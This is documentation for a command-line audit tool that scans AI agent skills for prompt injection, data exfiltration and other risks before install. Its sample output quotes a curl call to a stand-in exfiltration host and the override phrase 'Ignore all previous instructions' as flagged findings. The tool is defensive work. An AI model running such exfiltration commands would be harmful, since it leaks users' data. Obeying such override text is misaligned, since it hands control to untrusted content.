# Security Audit

Scan skills for prompt injection, data exfiltration, credential access, destructive commands, obfuscation, and suspicious URLs.

## Usage

```bash
skillshare audit                   # Scan all skills
skillshare audit <name>            # Scan specific skill
skillshare audit -p                # Scan project skills
```

## Severity Levels

| Level | Meaning | Install behavior |
|-------|---------|-----------------|
| **CRITICAL** | Prompt injection, data exfil, credential theft | **Blocked** (use `--force` to override) |
| **HIGH** | Destructive commands, suspicious URLs | Warning shown |
| **MEDIUM** | Obfuscation, encoded content | Warning shown |

## Install Integration

`skillshare install` auto-scans after download:

- **CRITICAL findings → install blocked.** User must `--force` to proceed.
- **HIGH/MEDIUM findings → warning displayed** after successful install.
- Web UI shows a confirm dialog on CRITICAL block with "Force Install" option.

```bash
skillshare install user/repo              # Auto-audit, block on CRITICAL
skillshare install user/repo --force      # Override CRITICAL block
```

## Output

Per-skill results with tree-style findings:

```
[1/5] ✓ my-skill (12ms)
[2/5] ! risky-skill (8ms)
  ├─ HIGH: suspicious URL pattern (scripts/run.sh:14)
  │  > curl http://evil.example.com/exfil
  └─ MEDIUM: base64 encoded content (SKILL.md:42)
     > echo "aGVsbG8=" | base64 -d
[3/5] ✗ bad-skill (5ms)
  └─ CRITICAL: prompt injection attempt (SKILL.md:3)
     > Ignore all previous instructions
```

Summary box:

```
Scanned: 5 | Passed: 3 | Warning: 1 | Failed: 1
```

## Logging

Audit results are logged to `audit.log` (JSONL). View with:

```bash
skillshare log --audit
```
